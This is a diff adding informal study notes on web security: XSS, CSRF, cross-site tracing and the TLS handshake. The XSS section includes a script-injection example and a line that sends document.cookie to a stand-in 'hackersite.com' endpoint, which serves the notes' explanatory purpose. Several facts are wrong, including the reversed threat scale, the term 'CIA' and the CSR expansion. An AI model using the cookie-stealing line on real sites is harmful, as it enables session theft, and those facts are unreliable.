@@ -1,0 +1,99 @@
+Threat levels (A1(low threat) to A10 (high threat))
+
+CSRF
+	Rated at around A8 (low threat level)
+
+XSS
+	A2 !
+	Cross Site Scripting
+	Browser's trust on the Server is compromised
+
+	If there is a website that we trust, say www.trust.com
+
+	Hacker can steal cookies and credentials
+
+	Permanent:
+		Just because of one client's mistake, all other clients will be in trouble
+
+		Main servers that are targets:
+			The ones who update db without checking anything
+				Eg. comments section
+					insert into or select *
+
+					Comment this
+						<script>alert('hi');</script>
+
+					Next user will fetch all comments!
+						Thus the script will get fetched or executed
+
+					img.src = "hackersite.com/stealCookies.php?cookie=" + document.cookie;
+
+				Server that allows <b></b> etc :O
+
+		Solution:
+			php code
+			If the server uses setcookie(.............., httponly=true)
+				Then the cookie won't be accessible by local scripting languages
+				But not supported by all browsers
+
+		Old issue (now fixed):
+			XST
+				Cross site tracing
+				More involved script
+				Will send a TRACE request to the server
+					The server bounces it back
+					All cookies are there
+				When it returns, the hacker catches it and can read the cookies :O
+				And again, make some img element and pass the info to the hacker site
+			Fix:
+				All browsers have disabled the TRACE call
+				Similarly, the servers also usually don't respond to TRACE calls
+
+	Temporary:
+		Affects just a single client
+
+		Hacker wants you to go to your destination via him
+			Will send a script to the Trusted server
+			Bounced back with cookies
+		Will send the cookies to hacker's server
+
+		Homework that the hacker has done:
+			Knows that the server bounces back the request when that particular URL is bombarded with a query string
+
+----
+
+https
+	SSL / TLS
+	Want to prevent Man in the Middle attack
+
+	Public Key
+	Private Key
+	Complex algo
+		RSA or DSA
+		Impossible to break
+
+Validating Servers
+	Certificate Issuing Authority (CIA)
+		issues Digital Certificate
+	Eg. Verisign, Google, Symantec
+
+	CSR
+		Certificate Service Request
+	Then we have to install it
+
+	Certificate + PublicPrivate Key combo
+
+Sequence:
+	Client asks server for a certificate
+	Server sends the certificate and the public key
+	The client browser will check the certifier with the list of known certifiers that it has
+		If not found in that, it will alert the user
+	Client creates a session key
+	Encrypts using the public key
+	Sends it back to the server
+	The server can decrypt it using the private key
+	Creates an acknowledgement
+		encrypts it using the session key
+	Client already has the session key, so it's peace
+	Will check
+	Hence forth, all communications are done using the session key
